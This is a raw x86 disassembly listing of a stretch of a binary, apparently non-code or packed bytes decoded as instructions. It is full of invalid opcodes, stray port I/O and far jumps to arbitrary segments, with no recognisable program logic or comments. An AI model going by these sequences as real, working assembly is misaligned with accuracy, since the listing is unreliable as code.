  423615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423616:	dec    eax
  423617:	ret    
  423618:	(bad)  
  423619:	push   ss
  42361a:	cmp    al,0x70
  42361c:	and    DWORD PTR [ebx+0x39],0xcac8c20c
  423623:	jge    0x423627
  423625:	push   0xffffffcc
  423627:	xor    al,0xd0
  423629:	pop    edi
  42362a:	mov    ds,ebx
  42362c:	icebp  
  42362d:	or     eax,0x6349794a
  423632:	push   esp
  423633:	mov    ebp,0x7ea8d75a
  423638:	push   edx
  423639:	je     0x423625
  42363b:	ret    
  42363c:	mov    al,0x74
  42363e:	popa   
  42363f:	outs   dx,DWORD PTR ds:[esi]
  423640:	ret    0x35b9
  423643:	test   al,0x86
  423645:	adc    al,0xf3
  423647:	retf   0x1a39
  42364a:	enter  0xb6e8,0x10
  42364e:	lahf   
  42364f:	or     BYTE PTR [ecx+0x6c82f4b],0x92
  423656:	test   al,0xc7
  423658:	pop    edi
  423659:	push   0x4088fbc2
  42365e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42365f:	bound  ecx,QWORD PTR [esp+edx*2-0x750b977b]
  423666:	mov    eax,0x13a730f3
  42366b:	fistp  DWORD PTR [eax]
  42366d:	mov    edi,0x64799049
  423672:	in     eax,0xd7
  423674:	and    edx,esp
  423676:	dec    ebp
  423677:	mov    eax,ds:0x4e7d1885
  42367c:	mov    cl,0xb9
  42367e:	fiadd  DWORD PTR [eax]
	...
  423688:	add    BYTE PTR [eax],al
  42368a:	pop    eax
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0xeda42923
  423697:	ret    0x9a23
  42369a:	scas   eax,DWORD PTR es:[edi]
  42369b:	les    eax,FWORD PTR [ecx]
  42369d:	add    BYTE PTR [ebp+0x6],bh
  4236a0:	add    BYTE PTR [eax],al
  4236a2:	gs (bad) 
  4236a4:	in     al,0xa5
  4236a6:	mov    bl,BYTE PTR [ebx+0x4ac9c686]
  4236ac:	push   ds
  4236ad:	jl     0x423706
  4236af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236b0:	test   eax,0x771a50
  4236b5:	mov    eax,ds:0x81303761
  4236ba:	in     eax,0x96
  4236bc:	(bad)  
  4236bd:	adc    al,0x89
  4236bf:	dec    esp
  4236c0:	push   ss
  4236c1:	(bad)  
  4236c2:	and    dh,BYTE PTR [ecx+0x68b23e47]
  4236c8:	dec    edx
  4236c9:	xor    al,0xc7
  4236cb:	mov    ds:0xb76ad533,al
  4236d0:	sbb    dh,BYTE PTR [ecx]
  4236d2:	ret    
  4236d3:	pop    ds
  4236d4:	fs out 0x70,al
  4236d7:	aaa    
  4236d8:	bound  esp,QWORD PTR [ebp+0x22]
  4236db:	popa   
  4236dc:	xchg   esi,eax
  4236dd:	cmc    
  4236de:	push   edi
  4236df:	out    dx,al
  4236e0:	rcr    DWORD PTR [ecx-0x66],cl
  4236e3:	cli    
  4236e4:	jecxz  0x423732
  4236e6:	sub    edx,ecx
  4236e8:	xor    esp,esi
  4236ea:	les    ebp,FWORD PTR [ebp+esi*8-0x4451bbee]
  4236f1:	adc    eax,DWORD PTR [esp+edx*4]
  4236f4:	inc    edx
  4236f5:	mov    al,ds:0xefc68807
  4236fa:	es out 0xbd,eax
  4236fd:	xchg   esi,eax
  4236fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236ff:	adc    al,0xb0
  423701:	nop
  423702:	add    al,0x7c
  423704:	data16 jno 0x423712
  423707:	mov    ds:0x5deae01d,eax
  42370c:	cmp    cl,BYTE PTR [eax-0x20]
  42370f:	add    edx,DWORD PTR [edi+0x83a0159]
  423715:	cs xchg edx,eax
  423717:	jmp    0x1614:0x45400723
  42371e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42371f:	cmp    bh,BYTE PTR [ebx+0x1860a6c5]
  423725:	and    bl,BYTE PTR [edx-0x31]
  423728:	jne    0x423725
  42372a:	fnstcw WORD PTR [ebp+ebp*4-0x352d7d2c]
  423731:	stos   BYTE PTR es:[edi],al
  423732:	push   ss
  423733:	test   DWORD PTR [ebx-0xb],ebx
  423736:	test   BYTE PTR [ebp+0x5ce38a9],ah
  42373c:	aam    0x42
  42373e:	push   ebp
  42373f:	nop
  423740:	jbe    0x423710
  423742:	add    al,0x76
  423744:	pop    ss
  423745:	shr    esp,cl
  423747:	mov    edi,0xc5734a30
  42374c:	cs jecxz 0x42374c
  42374f:	or     BYTE PTR [ecx-0x1f],0x9b
  423753:	ret    0xcfdb
  423756:	cmp    cl,BYTE PTR [edi-0x2a]
  423759:	add    eax,0xf6c6ebaf
  42375e:	les    ecx,FWORD PTR [ecx+edx*8-0x55]
  423762:	sub    DWORD PTR [ebp-0x4884d62b],ecx
  423768:	test   al,0x47
  42376a:	xchg   esi,eax
  42376b:	mov    ah,BYTE PTR [ebp+edi*1-0xd0bb6a1]
  423772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423773:	lds    ebx,FWORD PTR [edi-0x63b8b2b7]
  423779:	(bad)  
  42377a:	(bad)  
  42377b:	xchg   edx,eax
  42377c:	inc    eax
  42377d:	add    al,0xd8
  42377f:	pop    es
  423780:	int    0x41
  423782:	fcom   QWORD PTR [ecx+0x39dc6bc9]
  423788:	in     al,0xb8
  42378a:	nop
  42378b:	lock pushf 
  42378d:	jl     0x71292a9d
  423793:	hlt    
  423794:	aaa    
  423795:	arpl   WORD PTR [eax+0xa],ax
  423798:	in     al,0xf0
  42379a:	push   eax
  42379b:	dec    eax
  42379c:	(bad)  
  42379e:	test   BYTE PTR [edx],cl
  4237a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237a1:	xchg   BYTE PTR [esi+0x1168b8d1],dh
  4237a7:	loope  0x4237b4
  4237a9:	dec    esi
  4237aa:	add    al,0x7c
  4237ac:	jge    0x4237a5
  4237ae:	pushf  
  4237af:	(bad)  
  4237b0:	sbb    BYTE PTR [edx],ah
  4237b2:	mov    al,ds:0xb590002d
  4237b7:	mov    esi,0xc945dae7
  4237bc:	pop    ss
  4237bd:	fs fwait
  4237bf:	nop
  4237c0:	sbb    esi,esp
  4237c2:	cmp    DWORD PTR [edi+0x4c],ebp
  4237c5:	dec    edx
  4237c6:	leave  
  4237c7:	add    BYTE PTR [ebp-0x42319fe2],bl
  4237cd:	je     0x42378e
  4237cf:	adc    eax,0x99b31eaf
  4237d4:	std    
  4237d5:	xchg   ebx,eax
  4237d6:	ins    DWORD PTR es:[edi],dx
  4237d7:	hlt    
  4237d8:	arpl   WORD PTR [edi+0x31],sp
  4237db:	mov    BYTE PTR [eax+0x5e],0x5e
  4237df:	fcomp  DWORD PTR [ecx+0x56]
  4237e2:	jo     0x4237ff
  4237e4:	mov    esi,0x6bd0c454
  4237e9:	cmp    eax,ebp
  4237eb:	out    0x80,al
  4237ed:	in     eax,dx
  4237ee:	inc    eax
  4237ef:	clc    
  4237f0:	adc    esi,ecx
  4237f2:	push   ecx
  4237f3:	dec    eax
  4237f4:	cmp    ecx,DWORD PTR [eax-0x2f16900]
  4237fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237fb:	imul   ebx
  4237fd:	mov    ebp,0xe9c9dc3b
  423802:	out    dx,eax
  423803:	jb     0x4237ac
  423805:	es mov esi,0x1cbc6e56
  42380b:	dec    ebx
  42380c:	fmul   QWORD PTR [eax+ecx*1+0xedcd9c8]
  423813:	leave  
  423814:	in     eax,dx
  423815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423816:	push   esi
  423817:	xor    edi,DWORD PTR [edi]
  423819:	xchg   ecx,eax
  42381a:	sbb    bh,BYTE PTR [ebx]
  42381c:	pop    ebp
  42381d:	shl    BYTE PTR [edx-0x52],0x62
  423821:	push   ss
  423822:	pop    esp
  423823:	out    0x3b,eax
  423825:	dec    eax
  423826:	push   ss
  423827:	xchg   BYTE PTR [eax-0x3b],cl
  42382a:	sbb    eax,DWORD PTR [ebx+0x41]
  42382d:	repnz stos DWORD PTR es:[edi],eax
  42382f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423830:	cmp    al,0xe
  423832:	stos   BYTE PTR es:[edi],al
  423833:	push   edx
  423834:	in     al,0x71
  423836:	add    eax,0x43a639d
  42383b:	imul   ebp,DWORD PTR [ebp-0x18],0xfc48851e
  423842:	pusha  
  423843:	adc    BYTE PTR [ebp+0x3ac32fd1],dh
  423849:	enter  0xf6cf,0x32
  42384d:	ret    
  42384e:	sub    DWORD PTR [eax-0x26fcfa38],0xffffffa6
  423855:	js     0x4238c1
  423857:	neg    DWORD PTR [ebx-0x3a]
  42385a:	push   esi
  42385b:	inc    ecx
  42385c:	jne    0x4238cb
  42385e:	xchg   edi,eax
  42385f:	mov    BYTE PTR [ebx-0x2e],ch
  423862:	inc    ebx
  423863:	popf   
  423864:	jl     0x42383c
  423866:	mov    bh,0xc7
  423868:	ret    0x3d56
  42386b:	mov    esi,DWORD PTR [ecx]
  42386d:	add    bl,BYTE PTR [esi-0x28]
  423870:	cmp    al,0xeb
  423872:	pop    edx
  423873:	mov    WORD PTR [edi+0x77],fs
  423876:	nop
  423877:	popa   
  423878:	adc    eax,0xfc152cd2
  42387d:	adc    BYTE PTR [esi],al
  42387f:	jne    0x42385a
  423881:	dec    ebx
  423882:	rol    BYTE PTR [ecx+0x27],0x91
  423886:	sbb    eax,0x8ae67abc
  42388b:	push   esi
  42388c:	lods   eax,DWORD PTR ds:[esi]
  42388d:	loop   0x423874
  42388f:	pop    ds
  423890:	push   ecx
  423891:	enter  0xd0ea,0x4
  423895:	sbb    al,0xf2
  423897:	fwait
  423898:	pop    es
  423899:	xchg   ecx,eax
  42389a:	mov    cl,0x86
  42389c:	outs   dx,DWORD PTR ds:[esi]
  42389d:	mov    dh,0xaf
  42389f:	add    eax,0x72
  4238a2:	cmp    esi,DWORD PTR ds:0x8167257b
  4238a8:	xor    ecx,DWORD PTR fs:[ebx+eax*1]
  4238ac:	and    BYTE PTR [esi],ah
  4238ae:	xchg   edi,eax
  4238af:	and    dh,BYTE PTR [ebp-0x74]
  4238b2:	sbb    esi,edi
  4238b4:	pop    esp
  4238b5:	jns    0x423840
  4238b7:	enter  0xe147,0x54
  4238bb:	add    ebx,DWORD PTR [eax+eax*1+0x61dfe4e]
  4238c2:	sbb    ecx,esi
  4238c4:	xor    ecx,DWORD PTR [ecx+0x4c]
  4238c7:	mul    BYTE PTR [ecx+0x6c2dea98]
  4238cd:	pop    es
  4238ce:	iret   
  4238cf:	mov    eax,0x27b98f8a
  4238d4:	mov    edx,0x7ae2bbd6
  4238d9:	dec    ecx
  4238db:	test   al,0xe6
  4238dd:	mov    al,ds:0x32302857
  4238e2:	cli    
  4238e3:	sub    eax,0xbe10db12
  4238e8:	push   ebp
  4238e9:	jg     0x42391d
  4238eb:	bound  esi,QWORD PTR [esi]
  4238ed:	add    al,0x59
  4238ef:	sbb    edi,DWORD PTR [edi]
  4238f1:	lds    esi,FWORD PTR ss:[ebx-0x3d496501]
  4238f8:	mov    esp,0x4cf54016
  4238fd:	or     DWORD PTR [ecx],edx
  4238ff:	imul   ecx,DWORD PTR [eax+ebx*4+0x451cd83b],0x943f5a08
  42390a:	lods   al,BYTE PTR ds:[esi]
  42390b:	repnz or eax,0xa0ef3fa1
  423911:	sbb    ecx,DWORD PTR [eax]
  423913:	adc    BYTE PTR [ebp-0x42],bh
  423916:	addr16 jbe 0x423915
  423919:	xchg   ebp,eax
  42391a:	or     DWORD PTR [ebp-0x3f5f72b0],eax
  423920:	xor    esi,DWORD PTR [edi+0x4c]
  423923:	push   ecx
  423924:	push   ecx
  423926:	mov    bl,0xe0
  423928:	mov    eax,0x1547cfef
  42392d:	cmp    al,0x79
  42392f:	rcl    BYTE PTR [eax+0x69],cl
  423932:	js     0x4239ac
  423934:	mov    eax,0x9f45d57b
  423939:	call   0x59d9:0xf41b6c5
  423940:	push   ds
  423941:	(bad)  
  423943:	push   edx
  423944:	mov    al,0x35
  423946:	lds    edi,FWORD PTR [eax-0x48]
  423949:	cli    
  42394a:	addr16 cmp dl,ah
  42394d:	call   0x2699fc78
  423952:	mov    esp,0xeb3e6552
  423957:	into   
  423958:	adc    eax,ebx
  42395a:	sbb    ebp,edx
  42395c:	lahf   
  42395d:	cld    
  42395e:	add    eax,0xec306d53
  423964:	sub    al,0x6f
  423966:	mov    ch,0xf7
  423968:	(bad)  
  42396a:	cs (bad) 
  42396c:	shl    esi,cl
  42396e:	and    eax,0xba89203c
  423973:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  423975:	ret    0xc699
  423978:	lods   eax,DWORD PTR ds:[esi]
  423979:	enter  0x7cf3,0xcd
  42397d:	push   esp
  42397e:	dec    eax
  42397f:	dec    ebx
  423980:	jnp    0x423925
  423982:	dec    ebx
  423983:	cmp    DWORD PTR [ecx-0x21],esi
  423986:	add    ch,bl
  423988:	or     eax,0x3c4cc053
  42398d:	ins    BYTE PTR es:[edi],dx
  42398e:	xor    ah,BYTE PTR [edi]
  423990:	xchg   edi,eax
  423991:	jb     0x4239d2
  423993:	bound  edx,QWORD PTR [edi+0x6]
  423996:	xchg   ebx,eax
  423997:	daa    
  423998:	push   ds
  423999:	shr    DWORD PTR [ebp+0xe3ac66b],1
  42399f:	jae    0x5fded625
  4239a5:	or     al,0x64
  4239a7:	push   cs
  4239a8:	inc    edi
  4239a9:	adc    edi,DWORD PTR [ebx-0x7dbabe9c]
  4239af:	in     eax,0x27
  4239b1:	xchg   ebx,eax
  4239b2:	mov    bh,0xd4
  4239b4:	sbb    eax,0xf5a326f
  4239b9:	jmp    0x423a2f
  4239bb:	aas    
  4239bc:	lahf   
  4239bd:	jle    0x423a20
  4239bf:	jmp    0x67ce:0x5af4bf9b
  4239c6:	std    
  4239c7:	ss push eax
  4239c9:	(bad)  
  4239ca:	push   edx
  4239cb:	xchg   ecx,eax
  4239cc:	mov    ds:0xc684323f,al
  4239d1:	mov    esp,0x622f468
  4239d6:	dec    ebx
  4239d7:	cmp    ecx,DWORD PTR [ebx-0x7c]
  4239da:	pushf  
  4239db:	cmp    ecx,ecx
  4239dd:	xor    bl,al
  4239df:	lahf   
  4239e0:	das    
  4239e1:	inc    ebp
  4239e2:	pop    esi
  4239e3:	repnz mov ebp,0x64fce822
  4239e9:	in     al,dx
  4239ea:	jae    0x4239db
  4239ec:	rol    BYTE PTR [ebp-0x27],0x59
  4239f0:	ret    
  4239f1:	jns    0x42398b
  4239f3:	push   ecx
  4239f4:	and    al,0x61
  4239f6:	push   ebp
  4239f7:	mov    DWORD PTR [ebp-0x37],ebx
  4239fa:	or     eax,0x13e6adcc
  4239ff:	loopne 0x4239ef
  423a01:	int    0x30
  423a03:	adc    DWORD PTR [esi+0x5e],ecx
  423a06:	jb     0x4239c6
  423a08:	mov    ds:0x790ca65c,eax
  423a0d:	cwde   
  423a0e:	mov    ch,0xc6
  423a10:	rcl    DWORD PTR [ebp+0x1baa7b6d],1
  423a16:	stc    
  423a17:	or     ah,0xcb
  423a1a:	test   DWORD PTR [esp+edi*4+0xb],edx
  423a1e:	push   edi
  423a1f:	repnz in eax,0x64
  423a22:	dec    eax
  423a23:	pop    ds
  423a24:	jle    0x423a87
  423a26:	adc    ah,0xe3
  423a29:	hlt    
  423a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a2b:	inc    esi
  423a2c:	jae    0x4239fd
  423a2e:	adc    ch,BYTE PTR [esi-0x53fa62c2]
  423a34:	sub    BYTE PTR [ecx-0x37],ch
  423a37:	fwait
  423a38:	outs   dx,DWORD PTR ds:[esi]
  423a39:	mov    esi,0x19930cc1
  423a3e:	adc    al,0x8
  423a40:	jne    0x4239c6
  423a42:	rol    BYTE PTR [ebx],0x6
  423a45:	cli    
  423a46:	cmp    DWORD PTR [ecx],esp
  423a48:	jmp    DWORD PTR [si+0x16]
  423a4c:	adc    DWORD PTR [ecx-0x3a180fb0],0xfffffffb
  423a53:	adc    dl,BYTE PTR [eax+0x11c7c8e9]
  423a59:	inc    ebx
  423a5a:	sub    ah,0x3e
  423a5d:	retf   0x8444
  423a60:	or     al,0xac
  423a62:	adc    BYTE PTR [ebx+0x3681854e],0xac
  423a69:	push   ss
  423a6a:	xor    DWORD PTR [edi-0x259b5f2b],ebx
  423a70:	aad    0x68
  423a72:	mov    ebx,0xcf9c9e91
  423a77:	outs   dx,DWORD PTR ds:[esi]
  423a78:	hlt    
  423a79:	int3   
  423a7a:	pop    esi
  423a7b:	sbb    ecx,DWORD PTR [ebp-0x63]
  423a7e:	int    0x2b
  423a80:	mov    cl,0xc7
  423a82:	and    esp,ebp
  423a84:	aas    
  423a85:	adc    DWORD PTR [edx+0x1a],esi
  423a88:	mov    ds:0x6846cee2,al
  423a8d:	not    DWORD PTR [eax-0xf531235]
  423a93:	xchg   edx,eax
  423a94:	les    esi,FWORD PTR [eax+ebx*8-0x38]
  423a98:	xor    eax,0x18e8c4e1
  423a9d:	dec    esi
  423a9e:	loop   0x423a64
  423aa0:	push   eax
  423aa1:	jnp    0x423aef
  423aa3:	iret   
  423aa4:	lea    ebp,[ebp+0x7c]
  423aa7:	inc    eax
  423aa8:	xchg   edx,eax
  423aa9:	jns    0x423a8e
  423aab:	xchg   ebx,eax
  423aac:	test   eax,0x1fce9b68
  423ab1:	xchg   ecx,eax
  423ab2:	(bad)  
  423ab3:	sti    
  423ab4:	mov    edi,0x90473a14
  423ab9:	add    al,0x66
  423abb:	xchg   ecx,eax
  423abc:	and    edx,DWORD PTR [edx]
  423abe:	jns    0x423acd
  423ac0:	jge    0x423ab6
  423ac2:	stc    
  423ac3:	nop
  423ac4:	jge    0x423b09
  423ac6:	ins    DWORD PTR es:[edi],dx
  423ac7:	adc    BYTE PTR [edx],dh
  423ac9:	ret    0x6fc6
  423acc:	push   ss
  423acd:	dec    edi
  423ace:	push   0x93143a90
  423ad3:	or     al,0xdb
  423ad5:	and    eax,0x6f8d9a26
  423ada:	enter  0x2463,0x43
  423ade:	mov    al,ds:0x498ee8db
  423ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ae4:	lods   eax,DWORD PTR ds:[esi]
  423ae5:	inc    edi
  423ae6:	inc    esi
  423ae7:	mov    eax,ds:0x92bd86d8
  423aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423aed:	push   0xffffffa8
  423aef:	ja     0x423ab0
  423af1:	fwait
  423af2:	and    ch,ch
  423af4:	mov    al,0x25
  423af6:	mov    dh,0x13
  423af8:	or     al,0x0
  423afa:	mov    ebp,0xeabf27af
  423aff:	cmp    DWORD PTR [esi],0xffffffd7
  423b02:	push   ebx
  423b03:	jmp    0x9063:0x8ee2e846
  423b0a:	(bad)  
  423b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b0c:	aas    
  423b0d:	sub    eax,0x47c9c616
  423b12:	dec    ebx
  423b13:	and    DWORD PTR [ebx+0x58],esp
  423b16:	bound  esi,QWORD PTR ds:0xfb2f0ed4
  423b1c:	sbb    eax,0x49461bce
  423b21:	inc    edi
  423b22:	inc    esp
  423b23:	mov    edi,0x1ac6e19a
  423b28:	add    eax,0xd2b58a67
  423b2d:	xchg   ecx,eax
  423b2e:	(bad)  
  423b2f:	mov    cl,0x30
  423b31:	je     0x423b92
  423b33:	nop
  423b34:	xor    eax,0xc491b39d
  423b39:	add    al,0xf3
  423b3b:	jb     0x423ae8
  423b3d:	arpl   bx,ax
  423b3f:	ins    BYTE PTR es:[edi],dx
  423b40:	jg     0x423ad6
  423b42:	jge    0x423b65
  423b44:	dec    ebx
  423b45:	lahf   
  423b46:	imul   edi,eax,0xffffffe7
  423b49:	outs   dx,DWORD PTR ds:[esi]
  423b4a:	mov    ds:0xfca96076,al
  423b4f:	xor    eax,eax
  423b51:	es and al,0x8e
  423b54:	mov    ds:0xfef03d8f,eax
  423b59:	cld    
  423b5a:	in     eax,dx
  423b5b:	xchg   esp,eax
  423b5c:	into   
  423b5d:	mov    ds:0x365847e8,al
  423b62:	pop    ds
  423b63:	out    dx,al
  423b64:	call   0xbd87fb4
  423b69:	push   ebp
  423b6a:	xor    al,0x47
  423b6c:	nop
  423b6d:	jno    0x423b61
  423b6f:	daa    
  423b70:	cmp    esi,DWORD PTR [esi+eiz*1+0x4d]
  423b74:	dec    ecx
  423b75:	fidiv  DWORD PTR [edi+0x3e3c35c9]
  423b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b7c:	inc    edi
  423b7d:	(bad)  
  423b7e:	mov    cs,WORD PTR [edi-0x3efda358]
  423b84:	call   0xc68c608
  423b89:	cmp    DWORD PTR [esp+ecx*2-0x335da2c7],0x52ebc658
  423b94:	and    esi,ecx
  423b96:	div    BYTE PTR [ebx-0x9]
  423b99:	push   ebx
  423b9a:	jbe    0x423bb0
  423b9c:	mov    esp,0x38915e6b
  423ba1:	mov    dl,0xb2
  423ba3:	dec    esi
  423ba4:	dec    ebx
  423ba5:	ret    0x2471
  423ba8:	stos   BYTE PTR es:[edi],al
  423ba9:	mov    bh,0x64
  423bab:	cmp    al,0xf3
  423bad:	jns    0x423b81
  423baf:	adc    esp,ebx
  423bb1:	gs inc edx
  423bb3:	inc    esp
  423bb4:	dec    ebx
  423bb5:	xor    eax,0xf16954e2
  423bba:	mov    BYTE PTR [esi],bh
  423bbc:	(bad)  
  423bbd:	and    dl,dh
  423bbf:	faddp  st(5),st
  423bc1:	fcmovnbe st,st(3)
  423bc3:	mov    bl,BYTE PTR [edx-0x3a66eaad]
  423bc9:	ja     0x423b70
  423bcb:	cmp    eax,ebx
  423bcd:	out    dx,al
  423bce:	loope  0x423c0b
  423bd0:	xlat   BYTE PTR ds:[ebx]
  423bd1:	outs   dx,DWORD PTR ds:[esi]
  423bd2:	inc    esp
  423bd3:	sub    al,0x3e
  423bd5:	adc    al,BYTE PTR [bx+di+0x79]
  423bd9:	mov    dh,0x2
  423bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bdc:	jo     0x423bd8
  423bde:	mov    al,0xe
  423be0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423be2:	mov    edx,0x714df79f
  423be7:	sbb    DWORD PTR [esi-0x29ec6d1a],esp
  423bed:	jae    0x423bef
  423bef:	xlat   BYTE PTR ds:[ebx]
  423bf0:	out    dx,eax
  423bf1:	and    BYTE PTR [ecx+edi*1+0x9],0x98
  423bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bf7:	out    0x42,al
  423bf9:	cs sub al,0xbc
  423bfc:	(bad)  
  423bfd:	push   cs
  423bfe:	stos   BYTE PTR es:[edi],al
  423bff:	mov    eax,0x17a62258
  423c04:	mul    DWORD PTR [ebp-0x4a949527]
  423c0a:	push   ecx
  423c0b:	push   ds
  423c0c:	inc    esi
  423c0d:	cmp    ah,ch
  423c0f:	inc    ebx
  423c10:	add    eax,0xfb30b75b
  423c15:	ret    0xea81
  423c18:	cld    
  423c19:	xchg   edx,eax
  423c1a:	in     al,0x36
  423c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c1d:	sbb    al,0xda
  423c1f:	stos   BYTE PTR es:[edi],al
  423c20:	lds    edx,FWORD PTR gs:[edi+esi*8]
  423c24:	push   ds
  423c25:	adc    edi,DWORD PTR [ecx+0x3ec3fa2]
  423c2b:	jl     0x423ca4
  423c2d:	je     0x423bbd
  423c2f:	pop    edx
  423c30:	fidiv  DWORD PTR ds:0xb0cc8ff8
  423c36:	test   BYTE PTR [eax+0x25a0c1c6],cl
  423c3c:	cmp    eax,0xe22d8593
  423c41:	stos   BYTE PTR es:[edi],al
  423c42:	push   esi
  423c43:	pop    ds
  423c44:	xchg   edx,eax
  423c45:	(bad)  
  423c47:	mov    WORD PTR gs:[ebp-0x11892d5b],ss
  423c4e:	out    0x67,al
  423c50:	arpl   WORD PTR [ebp+edx*2+0x5be5fc8c],bp
  423c57:	stc    
  423c58:	push   eax
  423c59:	rol    BYTE PTR [ecx-0x43],1
  423c5c:	aas    
  423c5d:	fcom   st(0)
  423c5f:	jne    0x423cc5
  423c61:	xchg   edi,eax
  423c62:	mov    ebx,0xb998e960
  423c67:	and    eax,0x5140560
  423c6c:	lea    ebx,[edi+0x3d]
  423c6f:	push   ebx
  423c70:	push   0x8c9e0eef
  423c75:	inc    edx
  423c76:	mov    al,0xa4
  423c78:	jl     0x423ca5
  423c7a:	mov    ds:0xadd3202,eax
  423c7f:	push   edi
  423c80:	dec    eax
  423c81:	pop    esp
  423c82:	or     DWORD PTR [eax+ebx*1-0x34],0x2e03a12
  423c8a:	test   bl,bl
  423c8c:	cmp    DWORD PTR [esi],ebp
  423c8e:	enter  0x4861,0xac
  423c92:	mov    edx,0x6ce4a6d3
  423c97:	arpl   WORD PTR [ecx],dx
  423c99:	test   eax,0xd7763db
  423c9e:	pop    ebp
  423c9f:	jne    0x423c32
  423ca1:	add    ah,BYTE PTR [esi]
  423ca3:	dec    edi
  423ca4:	mov    edi,0xec98bec6
  423ca9:	sbb    BYTE PTR [ecx],dh
  423cab:	neg    BYTE PTR [edi*4+0x7c2f7cf4]
  423cb2:	dec    ebx
  423cb3:	shl    esp,0xd5
  423cb6:	(bad)  
  423cb7:	push   edx
  423cb8:	les    edi,FWORD PTR [eax]
  423cba:	js     0x423c4b
  423cbc:	xor    eax,0x5eb8c135
  423cc1:	shl    BYTE PTR [edx+edi*8+0xe],0x36
  423cc6:	stos   BYTE PTR es:[edi],al
  423cc7:	mov    dh,0xc1
  423cc9:	(bad)  
  423cca:	popf   
  423ccb:	jecxz  0x423d40
  423ccd:	xor    bh,BYTE PTR ds:0xeb74609a
  423cd3:	mov    ch,0xeb
  423cd5:	sub    BYTE PTR [edx+0x59],cl
  423cd8:	or     DWORD PTR [ecx+ebx*1+0x3649f429],eax
  423cdf:	dec    ebp
  423ce0:	mov    esp,0xf2082795
  423ce5:	mov    ebp,0xa9ab0dec
  423cea:	or     eax,0xc10f4817
  423cef:	push   edi
  423cf0:	mov    eax,ds:0x148aaa1b
  423cf5:	(bad)  
  423cf7:	sbb    al,0x6e
  423cf9:	adc    al,0xd5
  423cfb:	mov    ecx,0xc1ed25c7
  423d00:	pop    ebp
  423d01:	out    0x87,al
  423d03:	sbb    ebx,DWORD PTR [edi]
  423d05:	aaa    
  423d06:	aam    0x24
  423d08:	add    al,0x4d
  423d0a:	push   esp
  423d0b:	jo     0x423cf4
  423d0d:	xchg   esi,edx
  423d0f:	inc    edx
  423d10:	mov    edx,0xcc02834d
  423d15:	add    al,BYTE PTR [edx-0x44aea4a5]
  423d1b:	jb     0x423d7c
  423d1d:	dec    eax
  423d1e:	sbb    eax,0x0
  423d23:	add    BYTE PTR [eax],al
  423d25:	add    BYTE PTR [eax],al
  423d27:	add    BYTE PTR [eax],al
  423d29:	add    BYTE PTR [edx+edx*2+0x57],al
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax+0x570cfe6e],ah
  423d38:	jns    0x423cc2
  423d3a:	sub    al,0xcb
  423d3c:	add    DWORD PTR [eax],eax
  423d3e:	jge    0x423d46
  423d40:	add    BYTE PTR [eax],al
  423d42:	push   ebx
  423d43:	das    
  423d44:	pusha  
  423d45:	in     eax,dx
  423d46:	fbstp  TBYTE PTR [ebx]
  423d48:	fstp   QWORD PTR [ecx]
  423d4a:	or     al,cl
  423d4c:	mov    ebx,0x458a03e0
  423d51:	arpl   WORD PTR [ecx],si
  423d53:	(bad)  
  423d54:	daa    
  423d55:	popa   
  423d56:	in     al,dx
  423d57:	push   cs
  423d58:	es inc edx
  423d5a:	imul   edi,edi,0x1a2e6574
  423d60:	fwait
  423d61:	xchg   esp,eax
  423d62:	gs jne 0x423dad
  423d65:	adc    eax,DWORD PTR [ecx+0x19]
  423d68:	xchg   ebx,eax
  423d69:	lods   eax,DWORD PTR ds:[esi]
  423d6a:	loop   0x423dc5
  423d6c:	pushf  
  423d6d:	sub    BYTE PTR [edx-0x7d],al
  423d70:	(bad)  [esi-0xd5f620e]
  423d76:	loop   0x423d2f
  423d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d79:	inc    ebp
  423d7a:	add    BYTE PTR [edx*8-0x76cd95bc],cl
  423d81:	jmp    0x423d2d
  423d83:	out    0xe7,al
  423d85:	aaa    
  423d86:	adc    eax,0x1b34de25
  423d8b:	call   0xf129:0x26bf17f3
  423d92:	call   0xda98:0xbdf34fa3
  423d99:	fmul   QWORD PTR ds:0x3e35a8dd
  423d9f:	aam    0xbb
  423da1:	test   BYTE PTR [esi-0x13],cl
  423da4:	lock shl DWORD PTR [ebx+0x4b],0x73
  423da9:	mov    BYTE PTR [esi],ah
  423dab:	pop    ecx
  423dac:	jmp    0x73:0x582c8222
  423db3:	ds jp  0x423dad
  423db6:	das    
  423db7:	cmp    DWORD PTR [eax+edi*2],esp
  423dba:	and    eax,eax
  423dbc:	jnp    0x423d71
  423dbe:	sub    DWORD PTR [ebx-0x3d5c7619],eax
  423dc4:	mov    esi,0x2efc6708
  423dc9:	xor    eax,0x73bff388
  423dce:	jb     0x423e20
  423dd0:	sti    
  423dd1:	(bad)  
  423dd2:	pop    edx
  423dd3:	fdivr  DWORD PTR [edx]
  423dd5:	shl    bh,cl
  423dd7:	lahf   
  423dd8:	pop    ebx
